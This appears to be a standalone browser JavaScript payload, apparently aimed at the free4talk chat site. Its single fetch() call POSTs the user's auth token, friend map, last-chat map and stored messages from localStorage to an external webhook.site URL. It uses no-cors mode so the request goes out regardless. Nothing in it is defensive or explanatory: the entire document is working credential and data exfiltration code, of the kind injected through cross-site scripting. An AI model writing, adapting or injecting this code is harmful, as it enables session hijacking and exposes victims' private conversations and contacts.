fetch('https://webhook.site/fd4ace7a-71af-4393-8025-b439e857fd70',
  {
    mode: 'no-cors',
    method: 'POST',
    body: JSON.stringify({
      token: localStorage['user:token'],
      userMap: localStorage['friends:userMap'],
      lastChatMap: localStorage['friends:lastChatMap'],
      messages: localStorage['free4talk:messages'],
    }),
  });
